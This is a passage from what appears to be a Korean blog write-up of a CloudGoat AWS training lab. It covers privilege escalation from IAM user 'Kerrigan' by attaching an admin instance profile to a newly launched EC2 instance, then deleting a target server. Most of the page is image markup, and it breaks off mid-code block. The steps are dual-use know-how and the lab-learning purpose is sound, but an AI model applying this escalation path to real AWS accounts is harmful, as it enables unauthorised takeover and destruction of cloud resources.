href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>vpc (EC2)</li>\n<li>1 IAM User</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User “Kerrigan”</li>\n<li><code class=\"language-text\">iam:AttachUserPolicy</code> 권한이 있는 공격자는 액세스 권한이 있는 사용자에게 정책을 연결하고 해당 정책에 대한 권한을 공격자에게 추가하여 권한을 상승시킬 수 있습니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>EC2 instance “cg-super-critical-security-server.”를 삭제하는 것!</li>\n<li>접근 권한 구성이 갖쳐져 있는 환경에서 공격자는 <code class=\"language-text\">instance-profile-attachment</code> 권한을 활용하여 현재 권한이 아닌 높은 권한으로 새로운 EC2 인스턴스를 생성할 수 있습니다.</li>\n<li>새로운 EC2 인스턴스에서 액세스를 통해 공격자는 대상 계정 내에서 모든 관리 권한을 획득합니다.</li>\n<li><code class=\"language-text\">cg-super-critical-security-server</code> 를 삭제를 합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADNElEQVQoz0WRXUhTcRjGX4O2nTmlCMp2ztHtbM751Qc2yZk5bep0+7ud4xS3cmaBfVjUIKEks2al22o0nREpdCFU2JdhCZVZkAQZQRd1EyRk0aelUU7HTv3jLKOLh/fux/O8P2AYtSwjc5UpI3P1WtgzGpebbz5gLK+9ZbHWXarkGq5abPVX0MKtQJsvI9Y1YLG5LhuMVUM6vWULAIBSwUgpiiYoihIBTVGENj1bmaZWk9xDDBma7JZSIxqvtDkf2az2ewhxIwhx9xCyjyK2btzKOscsqGa0oNA0npnKbK71z4Ima71MvnK5ABQDrdJKAGBRdkMgvrB3vq5xBDfmXsQVqv0/aOTDTWwAN7Kn8R7kw1UYY9jQ9rvE6sfNNd24qfoMdhtb3m4CgDhVVqE0BlRlFxAAsDh3533aHvw277/5BTtCX6eLDk85UWf0e00g+qnqFD+LOiJj6blsQplntstxhg9v7Ym+rwlEI8VtP496MAZtnlMWAyoZLbFMBGJt0bklx5v79/UdC3Z4m3t35bvfrbN5w2dZb7jb5p3rRSd+tCTl7EiweKZqOd/cec4X7uJ8c30Wz2er8EfN2tL4GJAk5RIqmSGSloJYmCTkwgsMxQffbOT8/OeGHn7CGeS/WDoidwBAzHrDfleIn3Z18xP1IX6a7fzZ+hhjyMp3/G1IUZSEJOWEAF2j2xRvMG9LFH5S3Dqz3XQ8MmTzRgZs3si10vbIwEb3y6w892s91zmzb0tgpsncPrM3zz2hFxwo0/VS8j+QFAxJKIoiMvQO2RWMwXwi3OMM8h+2hqIvtp+NvqwO8FMlLZMFpZ45lyOIH+zu+3XbHsAjZZ5w/Q2MIXUdK6NIUphMxoALV5KsTCOUjIpIpHRS88n5Ac7PT1Z6o5MlR77WSVbopPHGof5lFcNPFPaRsaXlw0+JosGQDECUolATclr9t6HQ7H9oIoVJE8yLTIde5VSffF9ubf9oLdr/TJOiq08QG276l5iGrzPVd/sTy4YHxYbBtqQ4ENEKDSGnmVhD8b92/yJfmSRRpuUQgqDnC6IUmQZp6qpCKXgwkB4MldcxrGjFAAEMdLJC8CBE9AcAckKIsOmrhAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"30.png\"\n        title=\"30.png\"\n        src=\"/static/6acbb3ac1999559b254d8cd6d3c3054a/37523/30.png\"\n        srcset=\"/static/6acbb3ac1999559b254d8cd6d3c3054a/e9ff0/30.png 180w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/f21e7/30.png 360w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/37523/30.png 720w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/302a4/30.png 1080w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/07a9c/30.png 1440w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/4435f/30.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABV0lEQVQoz22R127CUBBELy22ce8dNwyYaogTFIm85P//aaJdhAQSD6Mtujs+uxZ+XMF0M6hWCNUModkRFC3gem7ee5wbAXQngqz5GE0sjKf2WwnDi6A5Aaayg/HMwlSyOU4+bEwkm+tHb6bc34iRycPvjEWSbdCuP5FmHRblnpUtdoiSFcJ4xfWyvcDza6haAsspoKgRxNh8T7ioDjj2N9Rtj3X3hc32G6vNwHnTnpHmHdbdgKbt4QU1HK9kw2e651zQF4nSdkt4QQPXr+CHDQ8TIdWGlcOwMn4jhA4hNDYhyocZRe4RxXD9w6obsD/+sLrdlc9Asb/84nS+oWxOKOsjn2CuxZAUH5ISYCZ5r4R5sePBojqgXvY8VDUnzoNoyVS0NilO10jzLdMTuRc20M3s1VCeB/wDSGRA61JOkcxUPWHpZgpVj2HaOWy34BNoRooP2X9Z+x/v78fOsV1suQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/8d79af64ad9f8b715dd67b8b69581204/37523/0.png\"\n        srcset=\"/static/8d79af64ad9f8b715dd67b8b69581204/e9ff0/0.png 180w,\n/static/8d79af64ad9f8b715dd67b8b69581204/f21e7/0.png 360w,\n/static/8d79af64ad9f8b715dd67b8b69581204/37523/0.png 720w,\n/static/8d79af64ad9f8b715dd67b8b69581204/c1328/0.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQI1y3OzU6DQAAAYRJtaqPVRNNLQwW2FCh/29KyLLsEQjWePJgmvfr+bzEmxMN3mdM40g357kcyWVOrHlV3pPXAIu8RImUXlWy8mECkeH6CF+wJdwXbMCeKJXFWkfoF14eK28ri+JsEoy8kqaKQlvJgyaVBRBVhdGSfqamJUOKLkmBbsnxxeVyueXpeM1+suJu9Mr9/mzgqKvm93mjMiNIDrR44dl+4ww/y0ExO5w7bfaLbkdZe0Gak0QO2+0CeDMl79n9o+AN7Sls7SI82CwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/bee1d92425d022ca91e3f1b7d86cde74/37523/1.png\"\n        srcset=\"/static/bee1d92425d022ca91e3f1b7d86cde74/e9ff0/1.png 180w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/f21e7/1.png 360w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/37523/1.png 720w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/efc66/1.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ol>\n<li>공격자는 IAM 사용자 “Kerrigan”으로 시작하여 높은 수준의 접근제어 권한에서 취약점 분석을 진행합니다.</li>\n<li>공격자는 먼저 EC2 인스턴스를 조회하면서 <code class=\"language-text\">cg-super-critical-security-server</code>을 식별은 하지만 대상에 직접 영향을 줄 수 가 없기 때문에 다른 방향으로 접근합니다.</li>\n<li>공격자는 계정 내의 기존 인스턴스 프로필과, 역활들을 Enum 하고 사용할 수 있는 인스턴스 프로필과 Rule을 결정합니다.</li>\n<li>때를 기다리던 공격자는 전체 관리자 역활을 인스턴스 프로필로 변경합니다.</li>\n<li>다음으로 공격자는 새로운 EC2 Key-Pair를 생성합니다.</li>\n<li>공격자는 해당 key-pari으로 새로운 EC2 인스턴스를 생성함으로써 셸 접근 권한이 생기게 되었습니다.</li>\n<li>익스플로잇의 마지막 단계에로서 공격자는 전체적인 관리자 권한이 부여된 인스턴스 프로필을 EC2 인스턴스에 연결을 합니다.</li>\n<li>새로운 EC2 인스턴스에 액세스 하고 스테이징 플랫폼으로 사용함으로써 공격자는 연결된 프로필의 역활에 의해 부여된 전체 관리자 권한으로 AWS CLI 명령을 실행할 수 있습니다.</li>\n<li>공격자는 “cg-super-critical-security-server” EC2 인스턴스를 종료하여 시나리오를 완료할 수 있습니다.</li>\n</ol>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"kerrigan-iam-profile\" style=\"position:relative;\"><a href=\"#kerrigan-iam-profile\" aria-label=\"kerrigan iam profile permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kerrigan IAM Profile</h3>\n<ul>\n<li>해당 환경에서 AWS Security Credential 정보가 있는 것을 확인할 수 있습니다.  해당 정보를 토대로 enum를 수행하려는 경우 첫 번째 단계는 AWS CLI를 사용해서 Security Credential 새로 생서하는 것입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxklEQVQY042QyQ6CQBBER9zYRrZhGdlEVMQFDSEeNMb4/x9VxjbxKB6qK33ol65iIlgikGvIuIIflojTGvOkxmrTYmanUI0QuhlBGTkYDG3yX2KuKAiW5nuSKxYw+JyOGeMfDWZgivUXlKl6iLZ7oDnfcG7vpO7yxKG5Isl2sN0MlpOBW/EX9gvK3qMoT6j3F1R1R5Hz4ki+KBvIZAvPL/CuZqoFYErPhwaX4FYCEZTUoePl0IwIE9UngG5K2jUzwngqeiO/ALLQeH72UtYxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/401003a28174efafcdd68d8b0a877161/37523/2.png\"\n        srcset=\"/static/401003a28174efafcdd68d8b0a877161/e9ff0/2.png 180w,\n/static/401003a28174efafcdd68d8b0a877161/f21e7/2.png 360w,\n/static/401003a28174efafcdd68d8b0a877161/37523/2.png 720w,\n/static/401003a28174efafcdd68d8b0a877161/4b446/2.png 877w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>pacu 도구를 사용하여 <code class=\"language-text\">aws__enum__account</code> 정보를 토대로 <code class=\"language-text\">kerrigan</code> 사용자의 aws accountid와 동일하지를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABjUlEQVQoz2WOWXOaYABFv2hrmhYENC4sn0tEQGQTRRC3NiZ9sP//95xOmLYvfThz79yHO0d405CXeUR/MMdyAgZjl+F4ycj0eB4tmq0/dNEGLp2nEaKl0fpkNDy09X/9L2K6SLFlyGS2JsvPrOOKNL+w2V4JwoKi/MEqrtkd7wwt/7+DD9p/aA5NGWI6K0w7IEpq/HBPHFesVgXLYEecHgmjiqJ8ZennGP0ZmjFBtHSEUBBCRbS7iAcF0dYQxXpLWZyIkj316Y3j4Tve6Y5Mz+RZSbqpidOPPPCyiLCcJXIa4EiP2TxEzgKKJ4+7miMfJeIU5twu7ySbI/nuQlFc8TdnHDcjWG0JoxLXy7AcHzlZMTJdurqDZkh0Q6JqNoOOifw6RekMEYe85ufbL7bFhd3+SlVeCE53guqdJNo1hof61thX9StFeSXNDmSbmiSrGuPsi8tNSbA6NsI3LNzJEq0n6eo2mmbR6c34rDlN/6aOUVSTrmahdk003cboT9B7kt7ztMF5dPCUBXpnxG/PhsHnSbF6iQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/6e36a6c33077f06366a996b361838082/37523/3.png\"\n        srcset=\"/static/6e36a6c33077f06366a996b361838082/e9ff0/3.png 180w,\n/static/6e36a6c33077f06366a996b361838082/f21e7/3.png 360w,\n/static/6e36a6c33077f06366a996b361838082/37523/3.png 720w,\n/static/6e36a6c33077f06366a996b361838082/c6bbc/3.png 910w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 AWS 정보를 이용하여 enumeration 정보를 확인해 봤습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>\ncloudgoat_output_kerrigan_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_kerrigan_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li>AWS Security Credential을 토대로 enumeration 한 결과 좀더 조사할 가치가 있음을 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABIElEQVQoz22RWW+DMBCEHXKgUiAJN4aGI9xQcpOqVVW1//8/TWRHaaDpw8i7D/vN7JoEUQPTSWD7BYKgRkhL+E6KiFagNIflpnC9Asrch2mvuWyaQV34IMIcwmQ5ECnrM8K45UrzA+JshzDZIKtOcL0cFjNzU8xEg9dZcYSseiCjO2w0XtyB63SHIHrFKmw4lPUMnGR7UJ8l8yDJLiYzDZoRYrP/hCQ7v+n6MA7cHb5QNW8o6w5N+452+4HT+QfH7htF1UF8MkFGKgewhMysD3kAsnV0M4ZmRDCsmNcOzWDaCZ4Vtzc4h25G8FcVCJG4wQ02WJkQ5ZqAidxe5SpheKelHuAlbLghq6ei/pjw7y/9JzY0nmp85TjZ8lv30/eBF3CGrDYVtXmVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/6c3fdb1852b6f336da6a6f80736e8781/37523/4.png\"\n        srcset=\"/static/6c3fdb1852b6f336da6a6f80736e8781/e9ff0/4.png 180w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/f21e7/4.png 360w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/37523/4.png 720w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/302a4/4.png 1080w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/07a9c/4.png 1440w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/1d499/4.png 1632w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시나리오 최종 목푱니 EC2 머신인 ‘cg-super-critical-security-server’ 가 사용 가능하지를 확인해봤습니다. AWS Rule은 EC2 태그를 검색할 수 있도록 태그 키가 “Name”인 태그에 EC2 인스턴스의 이름을 추가로 넣는 것 입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABg0lEQVQoz1WR3XKaYBCGMTE2qT8oioYfIcgHChgBjYMxiK02babtUXoBvYPe/9nT8cvEaQ+eeXdP3t13V7lPt4zdOfpIYNozLMmUu8nirfcSXJHiTBaE0we0roPatmh1LJptk5vmLbXLLhf1nlSl2BzYbI+U1Qu76hsP5Qv35Xfy5RPe3Zy5FrFx1kSjkLEp0HQP/VZgWFNsJ5ZDrz4MzqbK4fiDfPVEMM1IkiUi3zHKD0RxjudGPNYDvjRTkvqIQWtA40anca3LzU5btlVL9mfDKCnw/ExOMu2IIFySxGsWWYk7WdAzBS3dpW+GGHYkjZRaB+VCfdNa5//I6+KI56cywglfZHj+AhEusZyYjuagDT0Zta9PuP44RPnH4F3fUdK8JJyt8IMcP8iI0y2zbEe2LBFBxlgThEaCMxQYhqDZMaVJvdGXXF5pZ2TkXfWVYrOnrJ7ZPu7JP/3E+/xKtX9mtz3y2z3yJ3nlV1CwilLaXRu159A/PWfkow08WbdVW973Lxiqvkr85GspAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/a653e43979712bfe1e9a5076a43c00d2/37523/5.png\"\n        srcset=\"/static/a653e43979712bfe1e9a5076a43c00d2/e9ff0/5.png 180w,\n/static/a653e43979712bfe1e9a5076a43c00d2/f21e7/5.png 360w,\n/static/a653e43979712bfe1e9a5076a43c00d2/37523/5.png 720w,\n/static/a653e43979712bfe1e9a5076a43c00d2/636c2/5.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABm0lEQVQoz22Sy27bMBBF8//LAC3yDwW6b1dBs8imQDdpF61lUS9SpCyLEl962bcY2grS1AQuiCFHh3NndHc6nUAruAGPPzt8eJrx8M3h/jHg83eNg6pRcQEuBOpagnMBIWpIKePZoW1xPp0jw3uPuw3YdR3SlKEqCuQsRZ4x8KpEUZTYJXvsGUNVVUiSPZIkRVlxpIxBSoVt/QM0xkLUNfp+gO57HI8dBmMwDAOMtbDOwTiP3jgMxqLTGm3bou8NzucbFfoQ4kcUr+uKdd32i5ZlweIHrK7DMlos1/NpmvDKeAukC3kQKFWOXDJkMkVWpyhUhvrIIZoS5fMnsK8fUfz4An5sIRoBqVSE/wcMIUTL1OhNgnbOozXnPawPFzkf3cQ2GPMeePE/zXPsF/UvhDEmd52G1hpN08D7EF2M43jVFGMq5KZlSqoqHqfqrINqGuySFIKLOFka0DzPMW+6QjfgegtIF2VZgmU5rLVQSuH3n1184OXlF7TusWzAaXrVDeDFMr1OvweJkqhnVBXBqRWUTLDwRhT7d5b/AkdH/F4AAiZsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/bdd69477c9fdf17136fd8ea7833a8072/37523/6.png\"\n        srcset=\"/static/bdd69477c9fdf17136fd8ea7833a8072/e9ff0/6.png 180w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/f21e7/6.png 360w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/37523/6.png 720w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/f4b77/6.png 770w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code 